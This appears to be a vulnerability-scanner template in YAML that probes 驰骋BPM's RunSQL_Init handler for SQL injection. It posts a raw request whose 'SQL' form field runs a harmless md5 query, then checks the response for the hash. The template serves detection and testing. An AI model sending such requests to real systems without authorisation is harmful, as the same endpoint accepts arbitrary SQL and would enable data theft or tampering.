id: poc-yaml-ccbpm-runsql-init-sqli
info:
  name: 驰骋BPM RunSQL_Init SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    This template detects a SQL injection vulnerability in 驰骋BPM's RunSQL_Init endpoint.
variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"
http:
  - raw:
      - |
        POST /WF/Comm/Handler.ashx?DoType=RunSQL_Init HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----123128312312389898yd98ays98d

        ------123128312312389898yd98ays98d
        Content-Disposition: form-data; name="SQL"
        
        SELECT md5({{t1}})
        ------123128312312389898yd98ays98d--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "{{t2}}"
        part: body
